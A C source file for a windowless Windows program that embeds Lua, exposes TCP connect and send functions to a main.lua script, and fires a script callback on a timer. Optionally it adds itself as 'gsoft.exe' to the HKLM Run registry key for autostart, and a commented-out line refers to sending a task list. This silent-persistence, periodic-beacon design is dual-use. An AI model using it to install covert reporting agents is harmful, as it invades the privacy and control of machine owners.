#include <time.h>
#include <winSock2.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <direct.h>
#include "spawn.h"
#include "lua.h"
#include "lualib.h"
#include "lauxlib.h"
#include "trace.h"
#include "g_lua.h"

static lua_State* L = NULL;
SOCKET sock = INVALID_SOCKET;
static int tcp_connect(lua_State* L)
{
	const char* ip;
	int port;
	ip = lua_tostring(L,1);
	port = lua_tointeger(L,2);
//	TRACE_OUT("ip = %s;port = %d\n",ip,port);
	char* strip = (char*)malloc(strlen(ip) +1);
	strcpy(strip,ip);	
	struct hostent *Server = NULL;
	Server = gethostbyname(strip);
//	TRACE_OUT("gethostbyname\n");
	free(strip);
	if(Server == NULL){
		lua_pushnil(L);
		lua_pushnil(L);
		return 2;
	}
	if(sock != INVALID_SOCKET)
		closesocket(sock);
	sock = socket(PF_INET, SOCK_STREAM, 0);
	if(sock == INVALID_SOCKET){
		lua_pushnil(L);
		lua_pushnil(L);
		return 2;
	}
	SOCKADDR_IN addr;
	ZeroMemory((char*)&addr,sizeof(addr));
	addr.sin_family = AF_INET;
	CopyMemory((char *)&addr.sin_addr.s_addr, 
			(char *)Server->h_addr_list[0],
			Server->h_length);
	addr.sin_port = htons(port);
//	TRACE_OUT("htons\n");
	if(SOCKET_ERROR == connect(sock,(struct sockaddr *)&addr,sizeof(addr))){
		closesocket(sock);
		lua_pushnil(L);
		lua_pushnil(L);
		return 2;
	}
	lua_pushboolean(L,1);
	lua_pushlightuserdata(L,(void*)sock);
	return 2;
}

static int send_msg (lua_State* L)
{
	SOCKET s = (SOCKET)lua_touserdata(L,1);
	size_t len =0;
	const char* msg = lua_tolstring(L,2,&len);
	int result = send(s,msg,len,0);
	if(result == SOCKET_ERROR){
		lua_pushboolean(L,0);
		lua_pushinteger(L,0);
		return 2;
	}
	lua_pushboolean(L,1);
	lua_pushinteger(L,result);
	return 2;
}

static int close_socket(lua_State* L)
{
  SOCKET s = (SOCKET)lua_touserdata(L,1);
	closesocket(s);
	return 0;
}

static void lua_open_api(lua_State* L)
{
	lua_pushcfunction(L,&trace_out);
	lua_setglobal(L,"trace_out");
	lua_pushcfunction(L,&tcp_connect);
	lua_setglobal(L,"tcp_connect");
	lua_pushcfunction(L,&send_msg);
	lua_setglobal(L,"send_msg");
	lua_pushcfunction(L,&close_socket);
	lua_setglobal(L,"close_socket");
}

static void load_main_lua()
{
	char path[256] = {0};
	GetModuleFileName(NULL,path,256);
	char* left = strrchr(path,'\\');
	*++left = '\0';
	L = lua_open();
	luaL_openlibs(L);
	lua_pushstring(L,path);
	lua_setglobal(L,"path");
	luaopen_luaext_pipe(L);
  lua_open_api(L);
	strcat(path,"main.lua");
	if(luaL_dofile(L,path) != 0){
		lua_pop(L,1);
		lua_close(L);
		TRACE_OUT("load main.lua error!\n");
		L = NULL;
	}
	else{
		TRACE_OUT("load main.lua ok\n");
	}
}

int register_me()
{

	HKEY hroot;           //子键句柄
	DWORD dwDisposition=0;
	LONG result = RegCreateKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",0,
			NULL,0,KEY_ALL_ACCESS,NULL,&hroot,&dwDisposition);
/*
	if(result == ERROR_SUCCESS)
		TRACE_OUT("open key OK!\n");
	else{
		char msg[1024];
		FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM,
				NULL,
				result,
				MAKELANGID(LANG_NEUTRAL,SUBLANG_DEFAULT),
				(LPTSTR)&msg,
				0,
				NULL);
		TRACE_OUT(msg);
	}
	*/
	char path[256] = {0};
	GetModuleFileName(NULL,path,256);
	char* left = strrchr(path,'\\');
	*++left = '\0';
	char name[] = "gsoft.exe";
	//char dir[1024] = {0};
	//GetCurrentDirectory(1024,dir);
	strcat(path,name);	
	result = RegSetValueEx(hroot,"gsoft",0,REG_SZ,(BYTE *)path,strlen(path)+1);
	//result = RegSetValue(hroot,"gsoft",REG_SZ,dir,strlen(dir));
	/*
	if(result == ERROR_SUCCESS)
		TRACE_OUT("set value OK!\n");
	else{
		char msg[1024];
		FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM,
				NULL,
				result,
				MAKELANGID(LANG_NEUTRAL,SUBLANG_DEFAULT),
				(LPTSTR)&msg,
				0,
				NULL);
		TRACE_OUT(msg);
	}
*/
	RegCloseKey(hroot);
	return 0;
}


int WINAPI WinMain(HINSTANCE hinstance, HINSTANCE hPrevInstance, // 
		LPSTR lpCmdLine, int nCmdShow) // 
{
	//register_me();
	WSADATA wsaData;
	int err; 
	BOOL autorun = FALSE;
	int wVersionRequested = MAKEWORD( 2, 0); 
	err = WSAStartup( wVersionRequested, &wsaData );
	int period = 30;

	load_main_lua();
	if(L != NULL){
		lua_getglobal(L,"trace");
		BOOL bTrace = lua_toboolean(L,-1);
		lua_pop(L,1);
		lua_getglobal(L,"period");
		period = lua_tointeger(L,-1);
	  lua_pop(L,1);	
		lua_getglobal(L,"autorun");
		autorun = lua_toboolean(L,-1);
		lua_pop(L,1);
		if(autorun) 
			register_me();
  	if(bTrace)
			TraceInit();
	}

	UINT_PTR time_handle = SetTimer(NULL,0,1000 * period ,NULL);
	MSG msg;
	BOOL bRet;
	while ((bRet = GetMessage(&msg, (HWND) NULL, 0, 0)) > 0 ) { 
		if(bRet == -1)
			return -1;
		if(msg.message == WM_QUIT){
			call_lua(L,"on_quit","");
			break;
		}
		else if(msg.message == WM_TIMER)
			//send_tasklist(&sock);
			call_lua(L,"on_time","");
		TranslateMessage(&msg); 		
		DispatchMessage(&msg);
	}
	KillTimer(NULL,time_handle);
	//close_sock(&sock);
	lua_close(L);
	WSACleanup();
	TraceClose();
	return msg.wParam;
}

